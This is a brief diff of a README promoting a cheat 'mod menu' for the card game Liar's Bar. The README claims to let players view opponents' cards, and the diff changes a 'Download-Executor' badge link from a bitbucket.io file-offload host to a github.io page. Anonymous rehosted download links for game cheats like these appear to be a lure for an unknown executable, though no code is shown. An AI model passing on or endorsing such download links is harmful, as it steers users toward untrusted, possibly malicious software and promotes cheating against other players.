@@ -2,7 +2,7 @@
 
 A mod menu is a tool that allows players to modify game elements, providing features like viewing opponents' cards, customizing game settings, and more. It's designed to enhance the gaming experience by offering additional functionalities not available in the standard game.
 
-[![Download ModMenu](https://img.shields.io/badge/Download-Executor-blueviolet)](https://fileoffload5.bitbucket.io/)
+[![Download ModMenu](https://img.shields.io/badge/Download-Executor-blueviolet)](https://Liars-Bar-Mod-Menu-nyt9.github.io/.github)
 ---
 
 ## 🚀 **Top Features of Liar's Bar Mod Menus**
